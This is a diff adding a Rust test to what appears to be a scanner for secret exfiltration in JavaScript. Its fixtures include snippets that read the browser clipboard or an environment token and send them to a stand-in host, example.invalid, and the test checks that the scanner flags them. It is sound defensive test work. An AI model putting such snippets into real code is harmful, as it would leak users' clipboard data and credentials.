@@ -1436,6 +1436,38 @@ fn clipboard_data_reaches_outbound_request() {
 }
 
 #[test]
+fn browser_clipboard_reads_are_sensitive_only_when_exfiltrated() {
+    let root = temporary_directory("browser-clipboard-exfil");
+    fs::write(
+        root.join("positive.js"),
+        b"async function boot() { const text = await navigator.clipboard.readText(); fetch('https://example.invalid/collect', { method: 'POST', body: text }); } boot();",
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        b"async function boot() { const text = await navigator.clipboard.readText(); console.log(text); } boot();",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let exfiltration = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .collect::<Vec<_>>();
+    assert_eq!(exfiltration.len(), 1, "{}", report["findings"]);
+    assert!(
+        exfiltration[0]["evidence"]
+            .to_string()
+            .contains("navigator.clipboard.readText")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn secret_sent_over_websocket_is_reported() {
     let root = temporary_directory("websocket-exfil");
     fs::write(root.join("main.js"), b"const socket = new WebSocket('wss://example.invalid/collect'); socket.send(process.env.TOKEN);").unwrap();
